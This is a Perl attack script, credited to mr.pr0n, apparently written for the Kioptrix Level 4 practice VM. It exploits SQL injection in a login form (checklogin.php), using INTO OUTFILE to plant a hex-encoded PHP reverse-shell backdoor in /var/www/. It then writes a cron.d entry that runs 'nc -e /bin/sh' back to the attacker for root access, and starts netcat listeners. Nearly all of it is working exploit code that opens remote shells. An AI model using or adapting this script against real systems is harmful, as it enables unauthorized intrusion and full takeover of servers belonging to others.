use LWP::UserAgent;

# ----------------------------------------------------------------------
# Coded by mr.pr0n - http://ghostinthelab.wordpress.com - (@_pr0n_)
# ----------------------------------------------------------------------

print "------------------------------------\n";
print " Kioptrix Level 4 - Run2Shell Script\n";
print "------------------------------------\n";

print "\nEnter the IP address of the Kioptrix box (e.g.: http://192.168.178.21)";
print "\n> ";
$target=<STDIN>;
chomp($target);
$target = "http://".$target if ($target !~ /^http:/);

print "\nEnter the IP address for the reverse connection (e.g.: 192.168.178.27)";
print "\n> ";
$ip=<STDIN>;
chomp($ip);

print "\nEnter the port to connect back on (e.g.: 4444)";
print "\n> ";
$port=<STDIN>;
chomp($port);

menu:;
print "\n[+] Main Menu:\n";
print "    1. Limited Shell\n";
print "    2. Root Shell.\n";
print "    3. Exit.\n"    ;

print "> ";
$option=<STDIN>;
if ($option!=1 && $option!=2 && $option!=3)
{
print "Oups, wrong option.\nPlease, try again.\n";
goto menu;
}

if ($option==1)
{&limit}
if ($option==2)
{&root}
if ($option==3)
{&quit}

sub limit
{

	$payload =
	"<?php ".
	"system('/bin/bash -i > /dev/tcp/$ip/$port 0<&1 2>&1');".
	"?>";

	#Encode the payload to Hex.
	$payload =~ s/(.)/sprintf("%x",ord($1))/eg;
	$payload ="0x"."$payload";

	$filename = "t3hpWn.php";
	$dir = "/var/www/";

	$nc= "nc -lvp $port";
	print "\n[+] Wait for reverse connection on port $port...\n";
	system("xterm -e $nc &");

	print "[+] Uploading the backdoor to server... \n";
	$junk="''";

	$username = "admin";
	$password = "' OR 1=1 UNION SELECT $payload,$junk,$junk INTO OUTFILE '".$dir.$filename."' #";

	$ua = LWP::UserAgent->new or die;
	$req = HTTP::Request->new(POST => $target."/checklogin.php");
	$req->content_type('application/x-www-form-urlencoded');
	$req->content("myusername=".$username."&mypassword=".$password."&Submit=Login");
	$res = $ua->request($req);

	sleep(10);
	$int = LWP::UserAgent->new() or die;
	$check=$int->get($target."/".$filename);

	if ($check->content =~ m/was not found/g)
	{
	print "[-] Failed to upload the backdoor!\n\n";
	}
	goto menu;
}

sub root
{
	# --------------------------------------------------------------
	# Thanks to g0tmi1k for this local privilege escalation trick.
	# --------------------------------------------------------------

	$payload ="* * * * * root /bin/nc.traditional $ip $port -e /bin/sh ";

	#Encode the payload to Hex.
	$payload =~ s/(.)/sprintf("%x",ord($1))/eg;
	$payload ="0x"."$payload";

	$filename = "g0tr00t";
	$dir = "/etc/cron.d/";

	$nc= "nc -lvp $port";
	print "\n[+] Wait for reverse connection on port $port...\n";
	system("xterm -e $nc &");

	print "[+] Uploading the backdoor to server... \n";
	$junk="''";

	$username = "admin";
	$password = "' AND 1=1 union select $payload,$junk,$junk INTO OUTFILE '".$dir.$filename."' #";

	$ua = LWP::UserAgent->new or die;
	$req = HTTP::Request->new(POST => $target."/checklogin.php");
	$req->content_type('application/x-www-form-urlencoded');
	$req->content("myusername=".$username."&mypassword=".$password."&Submit=Login");
	$res = $ua->request($req);

	sleep(60);
	print "[+] Check the xterm window for the root shell... \n";
	goto menu;
}

sub quit
{
	exit(1);
}
